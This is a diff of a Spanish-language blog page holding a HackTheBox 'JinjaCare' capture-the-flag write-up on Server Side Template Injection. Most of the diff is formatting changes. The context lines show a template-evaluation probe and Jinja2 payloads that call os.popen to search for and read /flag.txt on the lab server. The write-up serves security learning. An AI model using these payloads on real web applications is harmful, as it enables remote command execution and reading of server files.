@@ -18,19 +18,19 @@
 
 
 
-	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="JinjaCare Web Challenge - HackTheBox">
-	<meta name="twitter:description" content="Este es un desafío web de nivel VeryEasy de la plataforma HackTheBox, en el cual se toca la vulnerabilidad Server Side Template Injection (SSTI)">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="JinjaCare Web Challenge - HackTheBox">
+  <meta name="twitter:description" content="Este es un desafío web de nivel VeryEasy de la plataforma HackTheBox, en el cual se toca la vulnerabilidad Server Side Template Injection (SSTI)">
 
 <meta property="og:url" content="https://celero0.github.io/posts/jinjacare/">
-	<meta property="og:site_name" content="Celero0 Blog">
-	<meta property="og:title" content="JinjaCare Web Challenge - HackTheBox">
-	<meta property="og:description" content="Este es un desafío web de nivel VeryEasy de la plataforma HackTheBox, en el cual se toca la vulnerabilidad Server Side Template Injection (SSTI)">
-	<meta property="og:locale" content="es">
-	<meta property="og:type" content="article">
-		<meta property="article:section" content="posts">
-		<meta property="article:published_time" content="2026-04-01T04:04:12+00:00">
-		<meta property="article:modified_time" content="2026-04-01T04:04:12+00:00">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="JinjaCare Web Challenge - HackTheBox">
+  <meta property="og:description" content="Este es un desafío web de nivel VeryEasy de la plataforma HackTheBox, en el cual se toca la vulnerabilidad Server Side Template Injection (SSTI)">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-04-01T04:04:12+00:00">
+    <meta property="article:modified_time" content="2026-04-01T04:04:12+00:00">
 
 
 
@@ -55,7 +55,7 @@
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.c170d9bb5caa71f3db9a208ff97e771abf73c1f55b67a1df27ba5666cd49fa9b.css" integrity="sha256-wXDZu1yqcfPbmiCP&#43;X53Gr9zwfVbZ6HfJ7pWZs1J&#43;ps=" crossorigin="anonymous" media="screen" />
   
 
 
@@ -224,7 +224,7 @@
 <p>Buscando en <code>PayloadsAllTheThings</code> (<a href="http://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2"  class="external-link" target="_blank" rel="noopener">http://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2</a>) por payloads de <code>SSTI</code> encontramos que hay opciones para <code>Jinja2</code>, como la página se llama <code>JinjaCare</code> probaremos estos en un principio</p>
 <img src="/images/Pasted image 20260401004538.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Utilizaremos el siguiente payload para nuestro campo de <code>Full Name</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{{</span>4*4<span style="color:#ff7b72;font-weight:bold">}}[[</span>5*5<span style="color:#ff7b72;font-weight:bold">]]</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{{</span>4*4<span style="color:#ff7b72;font-weight:bold">}}[[</span>5*5<span style="color:#ff7b72;font-weight:bold">]]</span>
 </span></span></code></pre></div><img src="/images/Pasted image 20260401004619.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Guardamos y ahora volvemos a descargar el certificado, teniendo como resultado, que la operación <code>{{4*4}}</code> se interpretó, mostrándonos el número 16, por tanto nos confirma la vulnerabilidad <code>SSTI</code>.</p>
 <img src="/images/Pasted image 20260401004658.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -242,15 +242,15 @@
   </a>
 </h2>
 <p>Sabiendo que ahora podemos ejecutar comandos como el usuario <code>root</code>, ahora solo quedaría encontrar la <code>flag</code> y leerla, para ello utilizaremos el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name *flag.txt* 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name *flag.txt* 2&gt;/dev/null
 </span></span></code></pre></div><p>Incorporado en el payload anterior quedaría así</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{{</span> self.__init__.__globals__.__builtins__.__import__<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;os&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>.popen<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;find / -name *flag.txt* 2&gt;/dev/null&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>.read<span style="color:#ff7b72;font-weight:bold">()</span> <span style="color:#ff7b72;font-weight:bold">}}</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{{</span> self.__init__.__globals__.__builtins__.__import__<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;os&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>.popen<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;find / -name *flag.txt* 2&gt;/dev/null&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>.read<span style="color:#ff7b72;font-weight:bold">()</span> <span style="color:#ff7b72;font-weight:bold">}}</span>
 </span></span></code></pre></div><p>Nos volvemos a cambiar el nombre</p>
 <img src="/images/Pasted image 20260401005140.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Descargamos el certificado, y nos muestra que el archivo que necesitamos está en el directorio raíz</p>
 <img src="/images/Pasted image 20260401005204.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto para leerlo solo debemos ocupar el siguiente payload</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{{</span> self.__init__.__globals__.__builtins__.__import__<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;os&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>.popen<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;cat /flag.txt&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>.read<span style="color:#ff7b72;font-weight:bold">()</span> <span style="color:#ff7b72;font-weight:bold">}}</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{{</span> self.__init__.__globals__.__builtins__.__import__<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;os&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>.popen<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;cat /flag.txt&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>.read<span style="color:#ff7b72;font-weight:bold">()</span> <span style="color:#ff7b72;font-weight:bold">}}</span>
 </span></span></code></pre></div><img src="/images/Pasted image 20260401005246.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Descargamos el certificado, y obtenemos la flag, completando el challenge</p>
 <img src="/images/Pasted image 20260401005317.png" style="width:100%; height:auto; display:block; margin:auto;">
